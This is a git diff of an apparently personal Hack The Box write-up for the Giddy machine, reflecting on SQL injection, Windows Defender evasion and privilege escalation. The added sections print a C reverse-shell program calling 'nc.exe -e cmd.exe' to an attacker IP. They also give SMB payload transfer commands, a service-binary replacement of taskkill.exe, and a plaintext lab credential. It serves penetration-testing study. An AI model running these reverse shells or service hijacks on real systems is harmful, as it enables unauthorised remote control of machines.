@@ -9,9 +9,15 @@ Learnt:
 - Icacls is power
 - I was really harsh on my self on trying this solo without looking at this and returning to this really the only issue is - SQLmap could havbe been used and in the real world it would have been.
 - I was way too hard on myself when it was not my fault.
-- Visual Studio
+- Visual Studio 
+- Building C Sharp project
+- Wrestling with DotNet versions
+- Infrastructure
+- I forget my C roots ...I should return to C 
 
 First the video is three years old and more tools are avaliable to me than to him way back then.
+
+<iframe width="560" height="315" src="https://www.youtube.com/embed/J2unwbMQvUo" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
 
 ![faceofmadness](Screenshots/faceofmaddness.png)
 *"Stare into face of unknowable joy, absolute blankness and pure madness... the man that tried not using SQLmap...waiting for the Boolean to say if 1 of 10s of characters was correct."*
@@ -108,7 +114,7 @@ But..
 ![wd](windowsdefendstrikesagain.png)
 Windows Defender removes it... 
 
-Then I went on a research spree on C Sharp,  Undetectable C sharp Reverse Shells and the best Windows-OS VM for ethical hacking for Archive. Returning months later I tried soloing this for a writeup and did not realise that I would really need SQLmap for this machine and then would have need Responder with `xp_cmdshell` so I am proud that I got as far as I did, but it also as a hindsight issue indicative of why some machines are bad for you the time for your growth and psychology. I actually crush the enumeration of the machine it is just blocked by tool usage that is not OSCP-related. Secondly I was really hard on myself with SQLinjection. The actual UNION based injection is three lines long and the other are blind and time-based so by all account the SQLi is one that you would only really get on a real assessment if you used SQLmap, because from all I have heard who actually has the time to do SQLi of that complexity on a time crunch without SQLmap in the 2020s.
+Then I went on a research spree on C Sharp, Undetectable C sharp Reverse Shells and the best Windows-OS VM for ethical hacking for Archive. Returning months later I tried soloing this for a writeup and did not realise that I would really need SQLmap for this machine and then would have need Responder with `xp_cmdshell` so I am proud that I got as far as I did, but it also as a hindsight issue indicative of why some machines are bad for you the time for your growth and psychology. I actually crush the enumeration of the machine it is just blocked by tool usage that is not OSCP-related. Secondly I was really hard on myself with SQLinjection. The actual UNION based injection is three lines long and the other are blind and time-based so by all account the SQLi is one that you would only really get on a real assessment if you used SQLmap, because from all I have heard who actually has the time to do SQLi of that complexity on a time crunch without SQLmap in the 2020s.
 
 ![](simplerevshell.png)
 
@@ -140,7 +146,7 @@ I decided given my history with wrestling with applications to try the known goo
 ```powershell
 impacket-smbserver share $(pwd)
 # Copy 
-xcopy \\10.10.14.16\share\taskkill.exe .
+xcopy \\10.10.14.17\share\taskkill.exe .
 # List a Service with the Registry 
 set-location 'HKLM:\SYSTEM\CurrentControlSet\Services'
 get-childitem . # gci .
@@ -152,3 +158,50 @@ get-childitem . | where-object { $_.Name -like '*UniFiVideoService*'}
 
 Nope, but close
 ![](nopebutclose.png)
+This did not work and fumbling with Visual Studios was not fun, but I try again today.  Quick reading [0xdf](https://0xdf.gitlab.io/2019/02/16/htb-giddy.html#privesc-to-system) for context to finish machine as soon as possible bypassed Defender he opted for a [Ebowla](https://github.com/Genetic-Malware/Ebowla) to obscucate a msfvenom payload, which seems very last decade and need to sort out my C(#/++) building workflow and infrastructure. An eternity later... 
+
+Although I know I did not use .NET 4.5 or below I had hard time so I just tried with .NET 7.0 just for the sake of my workflow.
+![](saidtryondotnet7.png)
+
+Given the fact I do not want to read hour of Visual Studio documentation if it change every year and some C sharp tool maybe ellispsed as all thing security given restriction of the monsters of insecurity Microsoft have made.
+
+```powershell
+Stop-Service "Uniquiti UniFi Video"
+Start-Service "Ubiquiti UniFi Video"
+Stop-Service "Uniquiti UniFi Video"
+```
+
+![](snowscan-ncandc.png)
+
+Snowscan another top 10 HTB player (again simple solution is - like xct it always simplist first) is a program that runs nc.exe.  
+
+```c
+//#include "stdafx.h" speeds up compile time 
+#include "stdlib.h"
+// i686-w64-mingw32-gcc shell.c -o shell.exe
+
+int main()
+{
+    system("nc.exe -e cmd.exe 10.10.14.23 4444");
+    return 0;
+}
+```
+
+Challenge now mingwc our way to success without knowing the exact version I think... So 
+```bash
+# Signin because timeout `giddy\stacy ; xNnWo6272k7x ; giddy`
+i686-w64-mingw32-gcc shell.c -o /tmp/taskkill.exe
+cp /usr/share/windows-resources/binaries/nc.exe /tmp/nc.exe
+cd /tmp 
+impacket-smbserver share $(pwd)
+# Copy both
+xcopy \\10.10.14.17\share\taskkill.exe .
+xcopy \\10.10.14.17\share\nc.exe .
+
+Start-Service "Ubiquiti UniFi Video"
+Stop-Service "Uniquiti UniFi Video"
+```
+
+The power of C!
+![](snowscanisawesome.png)
+
